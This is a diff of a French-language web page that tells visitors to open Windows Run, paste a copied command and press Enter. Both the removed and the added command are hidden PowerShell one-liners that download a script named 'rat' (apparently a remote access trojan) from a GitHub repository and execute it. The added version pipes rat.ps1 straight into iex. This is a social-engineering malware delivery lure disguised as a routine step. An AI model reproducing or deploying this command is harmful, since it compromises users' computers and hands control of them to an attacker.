@@ -38,7 +38,7 @@
         
         <p>Exécutez la commande suivante dans l'invite de commandes :</p>
         
-        <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; C:\Program Files\Python310\python.exe $env:TEMP\r.py"</div>
+        <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.ps1 | iex"</div>
         
         <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b>.</p>
         
